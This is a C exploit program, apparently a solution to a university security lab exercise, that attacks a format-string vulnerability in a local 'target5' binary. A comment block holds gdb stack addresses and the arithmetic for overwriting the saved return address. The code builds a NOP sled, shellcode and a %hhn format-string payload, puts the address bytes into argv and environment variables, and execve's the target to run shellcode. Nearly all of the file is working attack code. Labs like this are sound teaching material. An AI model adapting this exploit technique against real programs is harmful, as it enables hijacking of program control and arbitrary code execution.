#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
/*
(gdb) info frame
  Stack level 0, frame at 0x3021feb0:
  rip = 0x400b85 in foo (target5.c:15); saved rip = 0x400da0
  called by frame at 0x3021fed0
  source language c.
  Arglist at 0x3021fea0, args: arg=0x7fffffffd7b3 "test"
  Locals at 0x3021fea0, Previous frame's sp is 0x3021feb0
  Saved registers:
  rbp at 0x3021fea0, rip at 0x3021fea8
(gdb) p &formatString
  $2 = (char (*)[256]) 0x3021f9a0

rip: 0x3021fea8
formatString: 0x3021f9a0
shellcode is at arg[1][60], so we need to write 0x3021f9dc to rip
0xdc = 220 - 45 - 32 = 143 ---- 0x3021fea8
         0xf9 - 0xdc = 29  ---- 0x3021fea9
         0x21 - 0xf9 = 40  ---- 0x3021feaa
         0x30 - 0x21 = 15  ---- 0x3021feab       
<RA1><dummy><RA2><dummy><RA3><dummy><RA4><NOP><shellcode><formateString>    
*/
int main(void)
{
  char *args[3];
  char * env[19];
  char buf[256];

  //fill buf with NOP
  for(int i = 0; i < 256; i++)
    buf[i] = 0x90;
  //fill buf with shellcode, which equals to arg[1][60]
  for(int i = 4; i < 49; i++)
    buf[i] = shellcode[i - 4];

  //formatString
  char format[] = "%8x%8x%8x%8x%143x%hhn%29x%hhn%40x%hhn%15x%hhn";
  memcpy(buf + 49, format, strlen(format));

  args[0] = TARGET; 
  args[1] = "\xa8\xfe\x21\x30"; 
  args[2] = NULL;

  env[0] = "";
  env[1] = "";
  env[2] = "";
  env[3] = "dummmmy";

  env[4] =  "\xa9\xfe\x21\x30";
  env[5] = "";
  env[6] = "";
  env[7] = "";
  env[8] = "dummmmy";

  env[9] = "\xaa\xfe\x21\x30";
  env[10] = "";
  env[11] = "";
  env[12] = "";
  env[13] = "dummmmy";

  env[14] = "\xab\xfe\x21\x30";
  env[15] = "";
  env[16] = "";
  env[17] = "";
  env[18] = buf;

  // for(int i = 0; i <= strlen(buf); i++){
  //   printf("\\x%x", (unsigned char)buf[i]);
  // }
  // printf("\n");
  // for(int i = 0; i <= 18; i++){
  //     for(int j = 0; j <= strlen(env[i]); j++) {
  //         printf("\\x%x", (unsigned char) env[i][j]);
  //     }
  //     printf("\n");
  // }

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
